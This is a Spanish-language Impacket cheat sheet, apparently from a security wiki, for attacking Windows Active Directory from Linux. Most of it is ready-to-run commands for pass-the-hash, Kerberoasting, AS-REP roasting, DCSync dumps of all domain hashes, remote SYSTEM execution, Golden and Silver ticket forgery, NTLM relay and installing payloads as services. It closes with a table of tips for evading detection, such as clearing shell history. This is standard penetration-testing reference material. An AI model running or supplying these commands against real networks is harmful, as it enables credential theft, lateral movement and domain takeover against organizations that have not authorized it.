---
title: "Impacket Cheat Sheet"
category: "AD"
description: "Colección de scripts en Python para interacción con protocolos de red (SMB, Kerberos, DCERPC)."
image: "/images/wiki/5.png"
---

# Impacket: Python Network Protocol Library

**Impacket** es una coleccion de clases de Python para trabajar con protocolos de red a bajo nivel (SMB/CIFS, MSRPC, NTLM, Kerberos, WMI, LDAP). Es la herramienta esencial para ataques contra Active Directory **desde Linux** sin necesidad de ejecutar herramientas nativas de Windows. Practicamente todos los flujos ofensivos de AD (enumeracion, credenciales, movimiento lateral, persistencia Kerberos) tienen un script de Impacket dedicado.

[Repositorio Oficial](https://github.com/fortra/impacket) (anteriormente SecureAuthCorp, migrado a Fortra)

## Instalacion

```bash
# Desde pip (estable)
pip install impacket

# Desde repositorio (desarrollo)
git clone https://github.com/fortra/impacket.git && cd impacket && pip install .
```

> **Nota:** En Kali Linux viene preinstalado; los scripts estan como `impacket-<nombre>` (ej. `impacket-secretsdump`). Se recomienda usar entorno virtual para evitar conflictos de dependencias.

## Metodos de Autenticacion

Todos los scripts soportan multiples formas de autenticacion. Conocerlas es clave para adaptar el ataque al material disponible.

| Metodo | Sintaxis | Cuando usarlo |
|--------|----------|---------------|
| Password en claro | `DOMAIN/user:Password@TARGET` | Credenciales en texto plano |
| Hash NTLM (PtH) | `DOMAIN/user@TARGET -hashes LMhash:NThash` | Hash de SAM/NTDS/secretsdump |
| Hash NTLM (solo NT) | `DOMAIN/user@TARGET -hashes :NThash` | Sin hash LM (lo mas comun) |
| Ticket Kerberos | `DOMAIN/user@TARGET -k -no-pass` | TGT/TGS en `KRB5CCNAME` |
| Clave AES Kerberos | `DOMAIN/user@TARGET -aesKey <aes256key>` | AES256 extraida con secretsdump |

### Autenticacion Kerberos (`-k -no-pass`)

```bash
export KRB5CCNAME=/tmp/krb5cc_usuario
python3 secretsdump.py DOMAIN/user@dc01.domain.local -k -no-pass
```

> Con `-k` debes usar el **FQDN** del target (no IP). Configura `/etc/krb5.conf` y `/etc/hosts` si es necesario.

### Pass-the-Hash

```bash
python3 psexec.py CONTOSO/Admin@10.10.10.100 -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
# Solo hash NT (LM vacio)
python3 wmiexec.py CONTOSO/Admin@10.10.10.100 -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
```

## Enumeracion y Ataques de Identidad

### GetUserSPNs.py (Kerberoasting)

Solicita TGS para cuentas con SPN y extrae el hash para crackeo offline.

```bash
# Listar cuentas con SPN
python3 GetUserSPNs.py DOMAIN/user:Password -dc-ip 10.10.10.10
# Extraer hashes
python3 GetUserSPNs.py DOMAIN/user:Password -dc-ip 10.10.10.10 -request -outputfile kerberoast.txt
# Para un usuario especifico
python3 GetUserSPNs.py DOMAIN/user:Password -dc-ip 10.10.10.10 -request-user svc_sql
```

### GetNPUsers.py (AS-REP Roasting)

Busca usuarios con **DONT_REQ_PREAUTH** activado. Obtiene un TGT cifrado sin conocer la password.

```bash
# Sin credenciales validas (lista de usuarios)
python3 GetNPUsers.py DOMAIN/ -usersfile users.txt -format hashcat -outputfile asrep.txt -dc-ip 10.10.10.10
# Con credenciales (enumera automaticamente vulnerables)
python3 GetNPUsers.py DOMAIN/user:Password -dc-ip 10.10.10.10 -format hashcat -outputfile asrep.txt
```

### GetADUsers.py

Enumera usuarios del dominio via LDAP con informacion detallada.

```bash
python3 GetADUsers.py DOMAIN/user:Password -dc-ip 10.10.10.10 -all
```

### lookupsid.py (SID Brute-forcing)

Enumera usuarios y grupos haciendo brute-force de RIDs via interfaz LSA.

```bash
python3 lookupsid.py DOMAIN/user:Password@10.10.10.10
```

### samrdump.py

Enumera usuarios locales y del dominio usando el protocolo SAMR.

```bash
python3 samrdump.py DOMAIN/user:Password@10.10.10.10
```

### reg.py

Consulta y modifica el registro remoto de Windows.

```bash
python3 reg.py DOMAIN/user:Password@10.10.10.10 query -keyName HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run
```

### rpcdump.py

Enumera endpoints RPC expuestos. Util para descubrir servicios y vectores.

```bash
python3 rpcdump.py DOMAIN/user:Password@10.10.10.10 -port 135
```

## Extraccion de Credenciales: secretsdump.py

Script central de Impacket. Extrae secretos remotamente: SAM, LSA secrets, cached credentials y NTDS.dit (via DCSync o VSS).

### DCSync (simular un Domain Controller)

Requiere privilegios de **Replicating Directory Changes** (Domain Admin, Enterprise Admin, o delegacion explicita).

```bash
# Hashes NTLM de todo el dominio
python3 secretsdump.py DOMAIN/user:Password@dc01.domain.local -just-dc-ntlm
# Hash de un usuario especifico
python3 secretsdump.py DOMAIN/user:Password@dc01.domain.local -just-dc-ntlm -just-dc-user krbtgt
# Todo (NTLM + Kerberos keys + cleartext)
python3 secretsdump.py DOMAIN/user:Password@dc01.domain.local -just-dc
# Con historial de passwords
python3 secretsdump.py DOMAIN/user:Password@dc01.domain.local -just-dc -history
```

### Via VSS (Volume Shadow Copy)

Usa VSS para copiar NTDS.dit y SYSTEM sin bloqueo. Alternativa si DRSUAPI esta monitorizado.

```bash
python3 secretsdump.py DOMAIN/user:Password@dc01.domain.local -use-vss
```

### Dumpeo local (SAM/LSA)

Con admin local, extrae SAM y secretos LSA de una maquina miembro.

```bash
python3 secretsdump.py DOMAIN/user:Password@10.10.10.50
python3 secretsdump.py DOMAIN/admin@10.10.10.50 -hashes :NThash
```

### Opciones relevantes

| Flag | Descripcion |
|------|-------------|
| `-just-dc` | Solo DCSync (NTLM + Kerberos keys + cleartext) |
| `-just-dc-ntlm` | Solo hashes NTLM via DCSync |
| `-just-dc-user USER` | DCSync de un usuario especifico |
| `-use-vss` | Volume Shadow Copy en vez de DRSUAPI |
| `-history` | Incluye historial de passwords |
| `-sam` / `-lsa` / `-ntds` | Extraer solo esa fuente |
| `-outputfile PREFIX` | Prefijo para ficheros de salida |

## Ejecucion Remota

### Tabla Comparativa

| Script | Protocolo | Privilegio | Disco | Ruido | Requisitos |
|--------|-----------|-----------|-------|-------|------------|
| `psexec.py` | SMB pipes | **SYSTEM** | Si (.exe) | Alto | Admin local, 445 |
| `smbexec.py` | SMB pipes | **SYSTEM** | No | Medio | Admin local, 445 |
| `wmiexec.py` | WMI/DCOM | Usuario | No | Bajo | Admin local, 135+ |
| `atexec.py` | Task Sched | **SYSTEM** | No | Medio | Admin local, 445 |
| `dcomexec.py` | DCOM | Usuario | No | Bajo | Admin local, 135+ |

### psexec.py

Sube un ejecutable a `ADMIN$`, crea servicio remoto, comunica via named pipes. Mas ruidoso pero fiable.

```bash
python3 psexec.py DOMAIN/user:Password@10.10.10.10
python3 psexec.py DOMAIN/user:Password@10.10.10.10 "ipconfig /all"  # comando unico
```

### smbexec.py

No sube binarios (fileless). Usa `%COMSPEC%` y redirige salida a fichero temporal. Mas sigiloso contra AV de ficheros.

```bash
python3 smbexec.py DOMAIN/user:Password@10.10.10.10
```

### wmiexec.py

Usa WMI via DCOM. No crea servicios ni escribe en disco. Menos detectado, pero requiere puertos DCOM dinamicos.

```bash
python3 wmiexec.py DOMAIN/user:Password@10.10.10.10
```

### atexec.py

Ejecuta comandos via Task Scheduler. La tarea se crea, ejecuta y elimina automaticamente.

```bash
python3 atexec.py DOMAIN/user:Password@10.10.10.10 "whoami"
```

### dcomexec.py

Ejecucion via objetos DCOM (MMC20.Application, ShellWindows). Alternativa cuando WMI esta bloqueado.

```bash
python3 dcomexec.py DOMAIN/user:Password@10.10.10.10 -object MMC20
```

## Ataques Kerberos

### ticketer.py (Golden / Silver Tickets)

Genera tickets Kerberos falsos. Requiere el hash NTLM de `krbtgt` (Golden) o de la cuenta de servicio (Silver), mas el SID del dominio.

```bash
# Golden Ticket
python3 ticketer.py -nthash <krbtgt_NThash> -domain-sid S-1-5-21-XXX-XXX-XXX -domain DOMAIN.LOCAL Administrator
# Silver Ticket (servicio especifico)
python3 ticketer.py -nthash <svc_NThash> -domain-sid S-1-5-21-XXX-XXX-XXX -domain DOMAIN.LOCAL -spn CIFS/server.domain.local Administrator
# Usar el ticket
export KRB5CCNAME=Administrator.ccache
python3 psexec.py DOMAIN/Administrator@dc01.domain.local -k -no-pass
```

### getST.py (S4U - Delegacion Restringida)

Solicita un Service Ticket usando S4U2Self/S4U2Proxy. Escala privilegios cuando una cuenta tiene constrained delegation.

```bash
python3 getST.py -spn CIFS/target.domain.local -impersonate Administrator DOMAIN/svc_account:Password -dc-ip 10.10.10.10
export KRB5CCNAME=Administrator@CIFS_target.domain.local@DOMAIN.LOCAL.ccache
python3 smbexec.py -k -no-pass DOMAIN/Administrator@target.domain.local
```

### ticketConverter.py

Convierte tickets entre formatos `kirbi` (Mimikatz/Rubeus) y `ccache` (Linux/Impacket).

```bash
python3 ticketConverter.py ticket.kirbi ticket.ccache   # kirbi -> ccache
python3 ticketConverter.py ticket.ccache ticket.kirbi   # ccache -> kirbi
```

## Relay Attacks: ntlmrelayx.py

Intercepta autenticaciones NTLM y las retransmite a servicios donde sean validas.

```bash
# Relay a SMB (ejecucion si admin)
python3 ntlmrelayx.py -t smb://10.10.10.10 -smb2support
# Relay a LDAPS (crear cuentas, delegar)
python3 ntlmrelayx.py -t ldaps://dc01.domain.local --escalate-user attacker
# Multiples targets
python3 ntlmrelayx.py -tf targets.txt -smb2support
# Ejecutar comando tras relay exitoso
python3 ntlmrelayx.py -t smb://10.10.10.10 -smb2support -c "whoami > C:\\proof.txt"
# Volcar SAM via relay
python3 ntlmrelayx.py -t smb://10.10.10.10 -smb2support --dump-sam
```

### Combinacion con Responder

```bash
# Terminal 1: ntlmrelayx escuchando
python3 ntlmrelayx.py -tf targets.txt -smb2support
# Terminal 2: Responder (SMB=Off, HTTP=Off en Responder.conf)
sudo responder -I eth0 -dwPv
```

## Herramientas SMB

### smbserver.py

Servidor SMB rapido para exfiltrar archivos, servir payloads o capturar hashes Net-NTLM.

```bash
python3 smbserver.py SHARE . -smb2support
# Con autenticacion
python3 smbserver.py SHARE . -smb2support -username user -password pass
```

### smbclient.py

Cliente SMB interactivo para navegar recursos compartidos, subir y bajar archivos.

```bash
python3 smbclient.py DOMAIN/user:Password@10.10.10.10
# Comandos: shares, use SHARE, ls, get file.txt, put local.txt
```

## Otros Scripts Utiles

### mssqlclient.py

Cliente MSSQL interactivo. Permite habilitar `xp_cmdshell` para ejecucion de comandos OS.

```bash
python3 mssqlclient.py DOMAIN/user:Password@10.10.10.10 -windows-auth
# Dentro: enable_xp_cmdshell -> xp_cmdshell whoami
```

### services.py

Gestiona servicios remotos de Windows (crear, iniciar, parar, eliminar).

```bash
python3 services.py DOMAIN/user:Password@10.10.10.10 list
python3 services.py DOMAIN/user:Password@10.10.10.10 create -name Svc -display "Svc" -path "C:\payload.exe"
python3 services.py DOMAIN/user:Password@10.10.10.10 start -name Svc
python3 services.py DOMAIN/user:Password@10.10.10.10 delete -name Svc
```

## Consideraciones OPSEC

| Aspecto | Recomendacion |
|---------|---------------|
| **DCSync** | Event ID 4662 con GUIDs de replicacion delata DCSync. Usar `-just-dc-user` reduce ruido. |
| **psexec.py** | Event ID 7045 (nuevo servicio) + binario en `ADMIN$`. Prefiere `wmiexec.py` para menos artefactos. |
| **Relay (ntlmrelayx)** | Detectable si monitorizan logins desde IPs inesperadas. Verificar que SMB signing este deshabilitado. |
| **Golden Tickets** | Duracion excesiva (>10h) o usuarios inexistentes son anomalias detectables. |
| **Hashes en CLI** | Quedan en historial de bash. Usar `unset HISTFILE` o pasar credenciales via fichero. |
| **Trafico de red** | Impacket genera firmas reconocibles. Kerberos (`-k`) es preferible a NTLM (flujo "normal" en AD). |

## Entradas Relacionadas

- **CrackMapExec / NetExec** - Automatizacion de funcionalidades de Impacket con mejor interfaz
- **Rubeus** - Equivalente Windows para ataques Kerberos (Kerberoasting, AS-REP, S4U)
- **Mimikatz** - Extraccion de credenciales en Windows (complemento local de secretsdump)
- **Responder** - Envenenamiento LLMNR/NBT-NS (se combina con ntlmrelayx)
- **BloodHound** - Enumeracion y analisis de rutas de ataque en AD
